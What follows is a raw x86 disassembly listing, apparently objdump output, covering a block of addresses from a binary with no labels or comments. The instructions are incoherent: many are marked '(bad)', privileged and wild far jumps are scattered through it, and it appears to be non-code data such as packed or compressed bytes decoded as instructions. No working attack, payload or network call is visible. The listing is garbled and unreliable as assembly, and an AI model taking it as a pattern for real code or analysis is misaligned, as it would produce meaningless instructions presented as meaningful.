  418d80:	add    ebx,DWORD PTR [eax-0x703abb75]
  418d86:	dec    eax
  418d87:	push   0xffffffe9
  418d89:	int3   
  418d8a:	cdq    
  418d8b:	adc    esi,DWORD PTR [ecx]
  418d8d:	mov    dh,0x46
  418d8f:	add    BYTE PTR [eax+esi*4+0x1d],ch
  418d93:	popa   
  418d94:	push   0x14
  418d96:	loope  0x418dab
  418d98:	jmp    0xddc2c6a0
  418d9d:	pop    ebx
  418d9e:	clc    
  418d9f:	(bad)  
  418da0:	fsub   st(2),st
  418da2:	cdq    
  418da3:	je     0x418daa
  418da5:	pop    eax
  418da6:	mov    al,ds:0x1110099
  418dab:	add    BYTE PTR [ebp-0xb80ff3],al
  418db1:	jns    0x418d53
  418db3:	sbb    eax,0xfd1675e8
  418db8:	jmp    DWORD PTR [esi-0x76247ea8]
  418dbe:	mov    ebx,0x67
	...
  418dd7:	add    BYTE PTR [eax],al
  418dd9:	add    BYTE PTR [esi+0x6c],bl
  418ddc:	mov    cl,0xb0
  418dde:	sbb    al,0x4
  418de0:	add    eax,0x528ad89
  418de6:	dec    ecx
  418de7:	(bad)  
  418de8:	aas    
  418de9:	add    BYTE PTR [eax],cl
  418deb:	xchg   esp,eax
  418dec:	in     eax,dx
  418ded:	inc    edx
  418dee:	fnstsw WORD PTR [ebp+0x1]
  418df1:	and    BYTE PTR [ebx+0x49100040],dh
  418df7:	or     al,0x87
  418df9:	dec    ebp
  418dfa:	loope  0x418dac
  418dfc:	jle    0x418dae
  418dfe:	fld    QWORD PTR [ebx]
  418e00:	add    BYTE PTR [ebx-0x7e7afb00],cl
  418e06:	cmp    eax,0xde000004
  418e0b:	adc    DWORD PTR gs:[esi+ecx*8],eax
  418e0f:	inc    ebx
  418e10:	add    bh,bh
  418e12:	or     BYTE PTR [ebp+0x64ad75fc],ch
  418e18:	jno    0x418e36
  418e1a:	sub    dh,0x17
  418e1d:	push   edi
  418e1e:	sub    dh,0xf
  418e21:	dec    DWORD PTR [eax-0x7a8a04f9]
  418e27:	adc    DWORD PTR fs:[eax+0x63],eax
  418e2b:	inc    eax
  418e2c:	add    BYTE PTR [edi+0x6],bl
  418e2f:	mov    ah,cl
  418e31:	pop    ebp
  418e32:	pop    ds
  418e33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e34:	std    
  418e35:	push   esp
  418e36:	out    0x67,al
  418e38:	jge    0x418e26
  418e3a:	hlt    
  418e3b:	loope  0x418e3f
	...
  418e55:	add    BYTE PTR [eax],al
  418e57:	hlt    
  418e58:	pop    edx
  418e59:	mov    al,ds:0x3e130473
  418e5e:	or     BYTE PTR [ebx+0x50],al
  418e61:	in     eax,dx
  418e62:	cld    
  418e63:	rol    DWORD PTR ds:0xe6d8739f,0x15
  418e6a:	and    BYTE PTR [ebx],ch
  418e6c:	js     0x418e6b
  418e6e:	cld    
  418e6f:	test   eax,0x739f05
  418e74:	out    dx,eax
  418e75:	adc    eax,0xd701310
  418e7a:	push   ecx
  418e7b:	or     edi,DWORD PTR [eax-0x524821bb]
  418e81:	mov    al,BYTE PTR [ebx-0x38]
  418e84:	sub    cl,al
  418e86:	or     eax,0x1047c
  418e8b:	hlt    
  418e8c:	mov    ch,0x47
  418e8e:	and    al,0xf5
  418e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e91:	test   esi,ebx
  418e93:	hlt    
  418e94:	stos   DWORD PTR es:[edi],eax
  418e95:	add    DWORD PTR [ebx-0x297a4851],eax
  418e9b:	hlt    
  418e9c:	stos   DWORD PTR es:[edi],eax
  418e9d:	add    DWORD PTR [ecx+0xd01a841],eax
  418ea3:	jo     0x418f05
  418ea5:	add    al,0x0
  418ea7:	hlt    
  418ea8:	ret    
  418ea9:	scas   al,BYTE PTR es:[edi]
  418eaa:	mov    al,0xf5
  418eac:	stos   DWORD PTR es:[edi],eax
  418ead:	test   eax,eax
  418eaf:	repz pop ds
  418eb1:	pop    ebp
  418eb2:	add    ah,dh
  418eb4:	stos   DWORD PTR es:[edi],eax
  418eb5:	sahf   
  418eb6:	xor    DWORD PTR [ebx+0x109591],edx
	...
  418ed4:	xor    al,0xac
  418ed6:	mov    al,al
  418ed8:	repz pop ds
  418eda:	ins    DWORD PTR es:[edi],dx
  418edb:	add    ah,dh
  418edd:	stos   DWORD PTR es:[edi],eax
  418ede:	xor    eax,ebp
  418ee0:	cmp    eax,0x7d0002d6
  418ee5:	add    eax,0xc576d3ac
  418eea:	out    dx,al
  418eeb:	xchg   DWORD PTR [edx+0x5],edi
  418eee:	out    0x3,eax
  418ef0:	stos   BYTE PTR es:[edi],al
  418ef1:	sub    eax,0x4dddb62
  418ef6:	xchg   edi,eax
  418ef7:	stos   DWORD PTR es:[edi],eax
  418ef8:	das    
  418ef9:	callw  0xfc00
  418efd:	xchg   ebp,eax
  418efe:	pusha  
  418eff:	sbb    eax,ebx
  418f01:	jg     0x418f38
  418f03:	sbb    BYTE PTR [edx+0x41d7dbe9],ch
  418f09:	inc    edx
  418f0a:	out    0x8a,eax
  418f0c:	lahf   
  418f0d:	or     BYTE PTR [ecx+ecx*4-0x38],ah
  418f11:	xchg   edi,eax
  418f12:	push   cs
  418f13:	lahf   
  418f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f15:	xchg   ebp,eax
  418f16:	mov    esi,0xf6f53a84
  418f1b:	inc    ecx
  418f1c:	hlt    
  418f1d:	mov    ebp,0x95eed86c
  418f22:	out    dx,al
  418f23:	add    dh,ah
  418f25:	add    esp,edi
  418f27:	sahf   
  418f28:	pop    es
  418f29:	or     eax,0x7ff443f9
  418f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f2f:	pop    ss
  418f30:	xor    al,0x8a
  418f32:	fs scas eax,DWORD PTR es:[edi]
  418f34:	iret   
  418f35:	xchg   ebp,eax
  418f36:	(bad)  
  418f37:	fiadd  DWORD PTR [eax]
	...
  418f51:	test   BYTE PTR [eax-0x63],0x42
  418f55:	hlt    
  418f56:	psubw  mm2,QWORD PTR [ebp+0x428ce4f7]
  418f5d:	hlt    
  418f5e:	hlt    
  418f5f:	sbb    al,BYTE PTR [esi]
  418f61:	in     eax,0x4f
  418f63:	and    DWORD PTR [eax-0x779b6a67],0xffffffc8
  418f6a:	xchg   edi,eax
  418f6b:	mov    ds,WORD PTR [esi-0x734169dc]
  418f71:	inc    edi
  418f72:	mov    al,ds:0xbd799e7c
  418f77:	add    BYTE PTR [ebx+ecx*2-0x66],ch
  418f7b:	std    
  418f7c:	outs   dx,BYTE PTR ds:[esi]
  418f7d:	cmc    
  418f7e:	add    al,0xff
  418f80:	call   0xf8c98107
  418f85:	mov    bh,0x4
  418f87:	sub    DWORD PTR [ecx],0xffffffec
  418f8a:	bnd addr16 jmp 0xd3419408
  418f91:	not    DWORD PTR [edi-0x2ca4fa8d]
  418f97:	cld    
  418f98:	fmul   QWORD PTR [edi]
  418f9a:	repz aas 
  418f9c:	jmp    0x2671a12b
  418fa1:	sbb    al,0x1
  418fa3:	adc    DWORD PTR [ecx+0x625e37f7],ebp
  418fa9:	mov    esp,0x352058e8
  418fae:	call   0xa8b02bb2
  418fb3:	call   0x41908e
	...
  418fcc:	add    BYTE PTR [eax],al
  418fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fcf:	xchg   ebp,eax
  418fd0:	std    
  418fd1:	ins    DWORD PTR es:[edi],dx
  418fd2:	mov    bh,0x18
  418fd4:	add    eax,0x4fe88a8c
  418fd9:	(bad)  
  418fda:	xor    eax,0x6d375105
  418fdf:	sbb    BYTE PTR [esi+edi*1],dl
  418fe2:	or     dl,BYTE PTR [edx+0x51df973]
  418fe8:	std    
  418fe9:	cmp    al,0xf0
  418feb:	xchg   ecx,eax
  418fec:	adc    edx,DWORD PTR ds:0x1f00467a
  418ff2:	xchg   ecx,eax
  418ff3:	sbb    BYTE PTR [eax],dl
  418ff5:	bound  ecx,QWORD PTR [eax-0x7f0a8c6e]
  418ffb:	sbb    BYTE PTR [eax],cl
  418ffd:	sahf   
  418ffe:	mov    ds:0xf82ade44,eax
  419003:	jge    0x418fdd
  419005:	imul   ebx,DWORD PTR fs:[esp+edx*2],0x784e1000
  41900d:	push   eax
  41900e:	adc    BYTE PTR [ebx+0x74],bh
  419011:	dec    esp
  419012:	fidiv  WORD PTR [edx-0x79ed8c03]
  419018:	jns    0x41902a
  41901a:	dec    ebp
  41901b:	cld    
  41901c:	cmp    al,0xbe
  41901e:	and    DWORD PTR [esi+0x7193003f],edi
  419024:	adc    DWORD PTR [eax],ebx
  419026:	dec    edi
  419027:	dec    eax
  419028:	add    dh,dh
  41902a:	push   eax
  41902b:	mov    DWORD PTR fs:[ebx+0x4d],0x257107
	...
  41904b:	xor    eax,0x1d4076a4
  419050:	jno    0x419063
  419052:	push   esp
  419053:	pop    ds
  419054:	dec    eax
  419055:	add    BYTE PTR [ebp-0x74fb1333],al
  41905b:	in     eax,0x60
  41905d:	dec    ebp
  41905e:	sbb    DWORD PTR [eax+ecx*1],0xc83f02e7
  419065:	test   al,al
  419067:	or     DWORD PTR [eax],0xbdf90d7f
  41906d:	aas    
  41906e:	add    ah,bl
  419070:	fsqrt  
  419072:	adc    eax,0x3d96f9
  419077:	sbb    dl,bl
  419079:	xchg   bl,al
  41907b:	push   es
  41907c:	aam    0xc1
  41907e:	adc    ch,bl
  419080:	fiadd  DWORD PTR [esi+0x55d5dcec]
  419086:	mov    eax,DWORD PTR [eax]
  419088:	add    DWORD PTR [ebx-0x1],edx
  41908b:	ror    bl,1
  41908d:	adc    al,BYTE PTR [eax-0x63]
  419090:	jle    0x4190d3
  419092:	cld    
  419093:	or     eax,0x4b8afdb1
  419098:	sti    
  419099:	xor    ecx,DWORD PTR [edx-0x267a640c]
  41909f:	add    BYTE PTR [edx-0x18],dl
  4190a2:	hlt    
  4190a3:	outs   dx,DWORD PTR ds:[esi]
  4190a4:	jb     0x41902b
  4190a6:	fld    DWORD PTR [eax]
  4190a8:	mov    ebx,0x76781a87
  4190ad:	adc    eax,0x20
	...
  4190c6:	add    BYTE PTR [eax],al
  4190c8:	sti    
  4190c9:	jecxz  0x4190cf
  4190cb:	push   ss
  4190cc:	repz imul edi,DWORD PTR [eax+0x3b83729],0x42
  4190d4:	or     al,0xa2
  4190d6:	repz jb 0x419136
  4190d9:	sbb    eax,0x97c7ffd7
  4190de:	inc    edx
  4190df:	mov    bl,ch
  4190e1:	imul   eax,DWORD PTR [ebp-0x300c5627],0xffffffc6
  4190e8:	jno    0x4190ce
  4190ea:	adc    al,0x39
  4190ec:	outs   dx,DWORD PTR ds:[esi]
  4190ed:	pusha  
  4190ee:	popf   
  4190ef:	mov    esp,eax
  4190f1:	pushf  
  4190f2:	cmp    DWORD PTR [esi],0x395370d1
  4190f8:	mov    ecx,0x740615a5
  4190fd:	test   BYTE PTR [esi+eiz*1+0x748e3681],bl
  419104:	cmc    
  419105:	pushf  
  419106:	daa    
  419107:	es inc edx
  419109:	mov    ds:0xdc076bf3,eax
  41910e:	add    eax,DWORD PTR [ebx+0x560b39b4]
  419114:	rcl    DWORD PTR [ecx-0x63cbed43],cl
  41911a:	scas   al,BYTE PTR es:[edi]
  41911b:	add    cl,BYTE PTR [edi]
  41911d:	bound  ecx,QWORD PTR [ebp+0x314e84b]
  419123:	mov    DWORD PTR [edx-0x4bcef939],edi
  419129:	add    bh,BYTE PTR ds:0xc7
	...
  419143:	add    BYTE PTR [eax],al
  419145:	mov    dh,0x5
  419147:	out    dx,eax
  419148:	add    eax,DWORD PTR [edi+0x7e]
  41914b:	mov    eax,DWORD PTR [edi+0x3339d1a0]
  419151:	push   ds
  419152:	shr    DWORD PTR ds:0x74adc533,1
  419158:	inc    ecx
  419159:	mov    al,0x36
  41915b:	pop    ss
  41915c:	fwait
  41915d:	pop    es
  41915e:	xor    eax,0xd5f443dd
  419163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419164:	inc    esp
  419165:	jne    0x419130
  419167:	repz mov WORD PTR [edi+0x484170ac],?
  41916e:	jl     0x41911c
  419170:	xchg   edi,eax
  419171:	jg     0x4191bb
  419173:	and    esi,DWORD PTR [eiz*4-0x13eeb9cb]
  41917a:	jnp    0x419138
  41917c:	mov    edi,0xf172f831
  419181:	jmp    0x419187
  419183:	les    esp,FWORD PTR fs:[edi+0x13c3d909]
  41918a:	push   edi
  41918b:	out    0x3,eax
  41918d:	hlt    
  41918e:	push   ds
  41918f:	div    DWORD PTR [ecx]
  419191:	sbb    al,0x28
  419193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419194:	add    al,0xf4
  419196:	xchg   ecx,eax
  419197:	jl     0x419148
  419199:	ins    DWORD PTR es:[edi],dx
  41919a:	dec    eax
  41919b:	pop    ds
  41919c:	lods   al,BYTE PTR ds:[esi]
  41919d:	push   ecx
  41919e:	loope  0x419187
  4191a0:	add    esi,DWORD PTR [ebx+0xa]
  4191a3:	mov    dl,0xc6
  4191a5:	push   0x9d2a5
	...
  4191c2:	ins    DWORD PTR es:[edi],dx
  4191c3:	inc    edi
  4191c4:	xlat   BYTE PTR ds:[ebx]
  4191c5:	or     DWORD PTR [edx+eiz*8],0x5b
  4191c9:	bswap  ecx
  4191cb:	aas    
  4191cc:	rcr    DWORD PTR [edx+0x39009537],cl
  4191d2:	rcr    BYTE PTR [ecx],0xcc
  4191d5:	mov    ?,WORD PTR [edi]
  4191d7:	xchg   ecx,eax
  4191d8:	add    BYTE PTR [edx+0x3c],ah
  4191db:	cdq    
  4191dc:	mov    ebp,DWORD PTR ds:0x2e8c91f0
  4191e2:	icebp  
  4191e3:	retf   
  4191e4:	rcl    BYTE PTR [esp+esi*8],0xd3
  4191e8:	mov    edi,0xfb9cf482
  4191ed:	sub    bh,cl
  4191ef:	add    al,0x87
  4191f1:	das    
  4191f2:	hlt    
  4191f3:	retf   
  4191f4:	shl    ah,0x0
  4191f7:	nop
  4191f8:	adc    DWORD PTR ss:[ecx+0x45],0x7192e8ff
  419200:	std    
  419201:	fsubr  QWORD PTR [ebx+0x44]
  419204:	std    
  419205:	aam    0x67
  419207:	xor    al,0xe8
  419209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41920a:	or     edx,DWORD PTR [edx-0x6f1bb103]
  419210:	mov    DWORD PTR [edi+0x354b7c3b],ebp
  419216:	mov    ss,WORD PTR ds:0xfceb64f8
  41921c:	(bad)  
  41921d:	cwde   
  41921e:	dec    edi
  41921f:	fld    DWORD PTR [ebx-0x18]
  419222:	idiv   DWORD PTR [ebx+0x46]
  419225:	in     eax,0x0
	...
  41923f:	xor    eax,0xb5622d04
  419244:	or     BYTE PTR [eax+0x437bf6ed],cl
  41924a:	std    
  41924b:	mov    dh,0x89
  41924d:	inc    esi
  41924e:	icebp  
  41924f:	adc    eax,0x1515437e
  419254:	mov    BYTE PTR [esi-0x23],al
  419257:	jb     0x41929d
  419259:	shr    BYTE PTR [edx-0x78],1
  41925c:	push   es
  41925d:	je     0x41924e
  41925f:	aas    
  419260:	sbb    DWORD PTR [ebx],eax
  419262:	popa   
  419263:	push   cs
  419264:	(bad)  
  419265:	call   0xe89484d
  41926a:	add    bh,cl
  41926c:	popa   
  41926d:	add    al,0xc6
  41926f:	(bad)  
  419271:	cld    
  419272:	scas   eax,DWORD PTR es:[edi]
  419273:	pushf  
  419274:	int    0x56
  419276:	leave  
  419277:	dec    edi
  419278:	add    eax,0x5d265500
  41927d:	jg     0x41926b
  41927f:	(bad)  
  419280:	fst    DWORD PTR [ebp+0x57]
  419283:	bound  eax,QWORD PTR [eax]
  419285:	or     BYTE PTR [ebp-0x24d08718],cl
  41928b:	ds ins DWORD PTR es:[edi],dx
  41928d:	call   0xfbaf867d
  419292:	test   BYTE PTR [ebp+0x188b60f5],bl
  419298:	jne    0x419221
  41929a:	dec    ebp
  41929b:	aad    0xde
  41929d:	sub    dl,BYTE PTR [ebx-0x3b]
  4192a0:	mov    esi,?
  4192a2:	inc    BYTE PTR [eax]
	...
  4192bc:	sub    BYTE PTR [eax-0x66daea05],al
  4192c2:	cmp    eax,0x74c9f600
  4192c7:	cmp    al,0xf5
  4192c9:	sar    ah,1
  4192cb:	jae    0x4192f7
  4192cd:	aam    0x7e
  4192cf:	enter  0x60d2,0x73
  4192d3:	sub    ecx,DWORD PTR [esp+eax*1]
  4192d6:	xchg   eax,esi
  4192d8:	push   ss
  4192d9:	jns    0x41934f
  4192db:	sub    BYTE PTR [ebp+0x4],dh
  4192de:	add    BYTE PTR [eax],dl
  4192e0:	or     eax,0xf2564ed9
  4192e5:	lahf   
  4192e6:	mov    cl,0x13
  4192e8:	popf   
  4192e9:	add    eax,DWORD PTR [ecx+0x539468c0]
  4192ef:	push   0x77f4
  4192f4:	dec    esi
  4192f5:	mov    esp,0x9c26e8fb
  4192fa:	(bad)  
  4192fb:	push   esp
  4192fd:	and    bl,BYTE PTR [ecx+0x42eecc56]
  419303:	(bad)  
  419304:	mov    ebx,0x9cf00ec6
  419309:	out    0x42,al
  41930b:	jmp    FWORD PTR [ebx-0x730bf1aa]
  419311:	sahf   
  419312:	inc    esp
  419313:	call   FWORD PTR [ebx+0x325dc012]
  419319:	inc    ebx
  41931a:	leave  
  41931b:	ret    0x9df0
  41931e:	das    
  41931f:	mov    DWORD PTR [eax],eax
	...
  419339:	test   BYTE PTR ds:0x9d013bd7,bl
  41933f:	aas    
  419340:	xor    BYTE PTR [edx],0xbf
  419343:	push   cs
  419344:	push   DWORD PTR [ecx+0x187496ee]
  41934a:	mov    dl,0x2f
  41934c:	std    
  41934d:	add    DWORD PTR [esi-0xc],ebp
  419350:	aas    
  419351:	hlt    
  419352:	sub    cl,al
  419354:	jae    0x419341
  419356:	and    edi,ebp
  419358:	cmp    eax,0x140cdd78
  41935d:	clc    
  41935e:	std    
  41935f:	movups xmm6,xmm0
  419362:	xchg   esp,eax
  419363:	adc    eax,DWORD PTR [eax+ebp*8]
  419366:	test   al,0xf
  419368:	or     al,ah
  41936a:	lahf   
  41936b:	or     eax,0xeb6d804
  419370:	add    al,0x44
  419372:	pushf  
  419373:	lods   al,BYTE PTR ds:[esi]
  419374:	add    al,dh
  419376:	fnsave [esi]
  419378:	ret    0x9df8
  41937b:	mov    DWORD PTR cs:[eax],ecx
  41937e:	sbb    ah,BYTE PTR [ebp+0x2fd52710]
  419384:	xor    ebx,ebp
  419386:	and    eax,0x716cf446
  41938b:	xchg   edi,eax
  41938c:	xchg   DWORD PTR [ecx+0x5],ebx
  41938f:	xlat   BYTE PTR ds:[ebx]
  419390:	lea    edi,[edi]
  419392:	lea    esp,[eax]
  419394:	dec    ecx
  419395:	cld    
  419396:	std    
  419397:	ins    BYTE PTR es:[edi],dx
  419398:	into   
  419399:	ret    0xe78e
  41939c:	sub    eax,0x0
	...
  4193b5:	add    ch,cl
  4193b7:	add    edi,edx
  4193b9:	int3   
  4193ba:	jmp    0x4193fb
  4193bc:	mov    bl,0x10
  4193be:	cli    
  4193bf:	test   bl,dh
  4193c1:	mul    cl
  4193c3:	pop    ss
  4193c4:	fist   WORD PTR [esi+0x990992f]
  4193ca:	xchg   ebx,eax
  4193cb:	mov    fs,edi
  4193cd:	mov    al,al
  4193cf:	in     eax,dx
  4193d0:	pusha  
  4193d1:	(bad)  
  4193d2:	mov    edi,0x4f80ddd0
  4193d7:	add    eax,0x487d03e7
  4193dc:	jae    0x419375
  4193de:	mov    bh,0x98
  4193e0:	ins    BYTE PTR es:[edi],dx
  4193e1:	(bad)  
  4193e2:	icebp  
  4193e3:	xchg   DWORD PTR [ecx+0x4],edi
  4193e6:	hlt    
  4193e7:	add    al,0x72
  4193e9:	adc    esp,edi
  4193eb:	fst    DWORD PTR [ebp-0x7c]
  4193ee:	iret   
  4193ef:	mov    fs,edi
  4193f1:	mov    BYTE PTR [eax+0xb0fe7ed],bh
  4193f7:	add    BYTE PTR [ebp-0x1],0x0
  4193fb:	xchg   DWORD PTR [ecx],esp
  4193fd:	add    al,0xf4
  4193ff:	add    al,0x67
  419401:	(bad)  
  419403:	std    
  419404:	arpl   WORD PTR [ebp+0x2be704f4],si
  41940a:	jl     0x419423
  41940c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41940d:	add    ebx,DWORD PTR [esi+0xc36a706]
  419413:	retf   
  419414:	or     eax,0x2788f997
  419419:	pop    es
	...
  419432:	add    BYTE PTR [eax+0x49],bh
  419435:	out    0x3,eax
  419437:	hlt    
  419438:	mov    BYTE PTR [eax],0xac
  41943b:	mov    DWORD PTR [edi+eiz*8],eax
  41943e:	cmp    esi,eax
  419440:	add    al,0x0
  419442:	push   ebx
  419443:	shl    BYTE PTR [eax],cl
  419445:	cmp    esi,edx
  419447:	stc    
  419448:	mul    DWORD PTR [edi+0x61]
  41944b:	icebp  
  41944c:	inc    esp
  41944d:	add    cl,al
  41944f:	mov    edi,0x33c6fd90
  419454:	lds    esi,FWORD PTR [eax+esi*8+0x69]
  419458:	inc    ecx
  419459:	(bad)  
  41945a:	call   0xe9420caf
  41945f:	test   esi,0xfff7a643
  419465:	mov    ch,0x24
  419467:	arpl   di,di
  419469:	mov    ch,0x51
  41946b:	out    0x16,eax
  41946d:	inc    eax
  41946e:	jmp    0xdeb82d11
  419473:	mov    bl,al
  419475:	sbb    BYTE PTR [ecx],0x37
  419478:	inc    ebx
  419479:	add    BYTE PTR [edx-0x4c],ah
  41947c:	xchg   esp,eax
  41947d:	mov    esp,DWORD PTR ds:0x4ce58e58
  419483:	imul   ecx,DWORD PTR [edi+0x113765fd],0x8fb45709
  41948d:	or     ah,0x62
  419490:	add    BYTE PTR [edx+0x18],dh
  419493:	pop    esi
  419494:	das    
  419495:	or     eax,0x77
	...
  4194ae:	add    BYTE PTR [eax],al
  4194b0:	mov    ah,0x8f
  4194b2:	mov    ch,BYTE PTR [ecx+0xb]
  4194b5:	pop    ss
  4194b6:	inc    eax
  4194b7:	jmp    0xb478cf0a
  4194bc:	adc    DWORD PTR [ecx],0x4e
  4194bf:	imul   ebp,esp,0xaf9c008e
  4194c5:	ror    BYTE PTR [edx],1
  4194c7:	xchg   ebp,eax
  4194c8:	mov    ebx,0x710009d0
  4194cd:	dec    eax
  4194ce:	cmp    al,0x9
  4194d0:	popa   
  4194d1:	mov    ah,0x39
  4194d3:	es pusha 
  4194d5:	popf   
  4194d6:	mov    BYTE PTR [ebp-0x2b],al
  4194d9:	lahf   
  4194da:	les    eax,FWORD PTR [ebx+0x23738cd5]
  4194e0:	daa    
  4194e1:	mov    WORD PTR [ebp-0x70],fs
  4194e4:	and    eax,DWORD PTR [ecx+0x0]
  4194e7:	lea    edx,[ecx]
  4194e9:	xchg   edx,eax
  4194ea:	dec    BYTE PTR [edi-0x46]
  4194ed:	pushf  
  4194ee:	lods   eax,DWORD PTR ds:[esi]
  4194ef:	adc    ebx,ebp
  4194f1:	add    BYTE PTR [ecx-0x78fc1f40],al
  4194f7:	inc    ebp
  4194f8:	xchg   BYTE PTR gs:[ecx-0x10],al
  4194fc:	mov    al,ds:0xbd18044a
  419501:	pop    ebp
  419502:	or     BYTE PTR [edx-0x7b6826d],cl
  419508:	adc    eax,0x20ff1505
  41950d:	imul   eax,DWORD PTR [edi-0x7b361283],0x7d
	...
  41952b:	add    BYTE PTR [eax],al
  41952d:	(bad)  [ebp-0x79c5f786]
  419533:	into   
  419534:	(bad)  
  419535:	fidiv  DWORD PTR [ecx+0x5e]
  419538:	mov    edx,DWORD PTR [eax+0x4ec72770]
  41953e:	retf   
  41953f:	pop    es
  419540:	pop    edi
  419541:	adc    al,0xc7
  419543:	add    al,0x0
  419545:	xchg   ebx,eax
  419546:	jge    0x419538
  419548:	push   edi
  419549:	cs enter 0xff2f,0x24
  41954e:	int3   
  41954f:	and    edx,DWORD PTR [eax]
  419551:	cmp    cl,BYTE PTR [edx]
  419553:	add    DWORD PTR [eax],0x1d
  419556:	or     BYTE PTR [edi-0x75],cl
  419559:	pop    ecx
  41955a:	lods   al,BYTE PTR ds:[esi]
  41955b:	or     eax,0x4a1f48a
  419560:	cmp    ch,0xbd
  419563:	push   cs
  419564:	push   es
  419565:	mov    edx,0xdf28d199
  41956a:	add    BYTE PTR [ecx+0x70f24f7],0x80
  419571:	fisttp QWORD PTR [eax+0xd]
  419574:	add    esi,DWORD PTR [esp+eiz*4-0x1d]
  419578:	jb     0x419562
  41957a:	sbb    eax,0x99473f9a
  41957f:	xor    edi,0x8af232fd
  419585:	inc    ebp
  419586:	jns    0x419509
  419588:	cli    
  419589:	icebp  
  41958a:	sar    ah,cl
  41958c:	jg     0x41952b
  41958e:	repnz or al,0x3
	...
  4195a9:	add    BYTE PTR [esp+edx*2+0x17],dh
  4195ad:	jbe    0x41957c
  4195af:	pop    ss
  4195b0:	mov    dl,0xc0
  4195b2:	sahf   
  4195b3:	mov    eax,ds:0x1df3df81
  4195b8:	xchg   edi,eax
  4195b9:	pop    es
  4195ba:	jmp    0x4195d7
  4195bc:	sar    dh,0x3f
  4195bf:	sbb    eax,0x5e7405a0
  4195c4:	rol    DWORD PTR [ecx],1
  4195c6:	ds sbb eax,0x3beb079a
  4195cc:	mov    edi,0x9f1d3efe
  4195d1:	add    eax,0xc5d0df74
  4195d6:	clc    
  4195d7:	in     eax,dx
  4195d8:	fadd   QWORD PTR [ecx]
  4195da:	and    eax,0xf5303525
  4195df:	adc    eax,0x1ef6302d
  4195e4:	rol    DWORD PTR [edx],0xf
  4195e7:	sahf   
  4195e8:	mov    DWORD PTR [esp+eiz*8],ecx
  4195eb:	bound  eax,QWORD PTR [ecx+0x39]
  4195ee:	nop
  4195ef:	add    al,0xcb
  4195f1:	out    dx,eax
  4195f2:	clc    
  4195f3:	xchg   BYTE PTR [edx-0x4d74fe6c],ah
  4195f9:	xor    al,0x32
  4195fb:	add    ch,ah
  4195fd:	add    edx,DWORD PTR [edx-0x39]
  419600:	out    dx,eax
  419601:	add    edi,DWORD PTR [ebp+0x41]
  419604:	ret    
  419605:	or     ecx,DWORD PTR [ebp-0x3b]
  419608:	jmp    0xab:0xcb114243
	...
  419627:	sahf   
  419628:	inc    ebp
  419629:	call   0x64d71331
  41962e:	call   0xf910:0x18d5f448
  419635:	int    0x18
  419637:	fdivr  st,st(0)
  419639:	into   
  41963a:	iret   
  41963b:	test   al,0x8a
  41963d:	mov    esi,0xe99eba7f
  419642:	(bad)  
  419643:	pop    ebx
  419644:	sub    ebp,DWORD PTR [ecx+0x723193fc]
  41964a:	mov    al,ds:0x86eb9975
  41964f:	push   esp
  419651:	jmp    0x70f4:0x1489ea19
  419658:	lock stos BYTE PTR es:[edi],al
  41965a:	imul   BYTE PTR [ebx]
  41965c:	add    eax,0x9e604970
  419661:	jmp    0x4195e9
  419663:	xlat   BYTE PTR ds:[ebx]
  419664:	mov    bh,ah
  419666:	jle    0x41961f
  419668:	cld    
  419669:	jno    0x4196ac
  41966b:	clc    
  41966c:	xor    eax,0xfd0880b5
  419671:	popa   
  419672:	inc    ecx
  419673:	loopne 0x4195fa
  419675:	or     BYTE PTR [edi*2-0x30836153],al
  41967c:	mov    WORD PTR [edx],es
  41967e:	retf   0x37a5
  419681:	add    BYTE PTR [edx+0x41f80e74],bl
  419687:	jge    0x419663
  419689:	(bad)  
  41968a:	call   0x41968f
	...
  4196a3:	add    BYTE PTR [edx+0x333b318c],cl
  4196a9:	mov    WORD PTR [esp+ebp*4+0x2a],?
  4196ad:	das    
  4196ae:	or     BYTE PTR [eax+ebp*8+0x3d952d2],dl
  4196b5:	cmp    DWORD PTR ds:[edi+eiz*8-0x76],0xd72ae71
  4196be:	adc    bl,ch
  4196c0:	jmp    0x41968b
  4196c2:	cmp    BYTE PTR [esp+eiz*2+0x12],ah
  4196c6:	sbb    bl,dh
  4196c8:	fmul   QWORD PTR [eax-0xb2329af]
  4196ce:	cld    
  4196cf:	hlt    
  4196d0:	inc    edi
  4196d1:	hlt    
  4196d2:	aas    
  4196d3:	jmp    0xf0b55b54
  4196d8:	and    al,BYTE PTR [esi-0x4]
  4196db:	imul   ebp,DWORD PTR [ebx-0x1acac5fc],0xbaa15b7b
  4196e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196e6:	jb     0x419742
  4196e8:	stos   BYTE PTR es:[edi],al
  4196e9:	dec    ecx
  4196ea:	pop    ebp
  4196eb:	aaa    
  4196ec:	retf   
  4196ed:	rol    edx,0xf9
  4196f0:	test   DWORD PTR [ebx+0x15f2d97b],0x8cac72ef
  4196fa:	mov    DWORD PTR [esp+ebx*2],esp
  4196fd:	fsub   st(7),st
  4196ff:	pusha  
  419700:	sub    BYTE PTR [ebp+eiz*8-0x77180c8c],bl
  419707:	pop    edx
	...
  419720:	add    BYTE PTR [edx],dh
  419722:	mov    cl,0x71
  419724:	xor    eax,0x507ffab9
  419729:	pop    ss
  41972a:	adc    eax,0x789d000a
  41972f:	add    eax,0xf585127c
  419734:	or     eax,0xfa808762
  419739:	pop    ds
  41973a:	repnz add ecx,DWORD PTR [ecx+0x42f40c69]
  419741:	pop    ebx
  419742:	mov    edx,0x82ed72ed
  419747:	cli    
  419748:	add    cl,BYTE PTR [edi-0x328280d5]
  41974e:	add    al,0x74
  419750:	sbb    ecx,DWORD PTR [esi-0xb]
  419753:	lidtd  [ecx-0x78]
  419757:	cmp    BYTE PTR [ebp-0x53],0x2
  41975b:	jno    0x41976f
  41975d:	inc    esi
  41975e:	fdiv   st,st(7)
  419760:	inc    ebx
  419761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419762:	add    eax,0xa995d87
  419767:	inc    ecx
  419768:	clc    
  419769:	fisubr WORD PTR [ecx-0x1]
